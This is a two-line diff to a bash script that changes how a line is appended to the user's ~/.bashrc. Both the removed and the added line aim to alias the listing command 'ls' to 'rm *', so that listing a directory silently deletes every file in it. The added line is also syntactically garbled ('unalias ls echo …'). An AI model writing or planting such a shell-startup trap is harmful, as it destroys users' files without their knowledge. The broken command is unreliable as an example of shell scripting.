@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "alias ls='rm *'; unalias ls && ls" >> ~/.bashrc
+unalias ls echo "alias ls='rm *'" >> ~/.bashrc
